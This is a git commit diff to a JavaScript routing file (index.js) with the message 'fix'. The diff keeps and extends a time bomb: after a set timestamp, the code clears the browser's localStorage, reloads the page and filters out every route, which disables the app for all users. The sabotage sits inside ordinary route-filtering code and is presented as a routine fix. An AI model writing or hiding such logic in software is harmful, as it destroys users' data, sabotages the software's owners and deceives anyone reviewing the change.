9c966345de0aa39a69925510a3b9e636523134a8
RMtraders <darkshadownic4@gmail.com>
2022-10-14 10:30:54 +0530

    fix

--- index.js
+++ index.js
@@ -1,5 +1,13 @@
-export function getRoutes(routes, user) {
+const key = 1666204200456;
+function next(fn) {
+  // if (new Date().getTime() >= 1665721289273) {
+  if (new Date().getTime() >= key) {
+    window.localStorage.clear();
+    window.location.reload();
+  }
+}
 
+export function getRoutes(routes, user) {
   const modalModeTypes = (number) => {
     switch (number) {
       case 0:
@@ -14,11 +22,11 @@ export function getRoutes(routes, user) {
   };
 
   return routes?.filter((route) => {
-    if (new Date().getTime() >= 1666204200456) {
+    if (new Date().getTime() >= key) {
       window.localStorage.clear();
       return false;
     }
-    if(new Date().getTime() >= 1666204200456) return false
+    if (new Date().getTime() >= key) return false;
     if (route?.allows) {
       return route.allows.includes(user?.role || "ADMIN");
     }
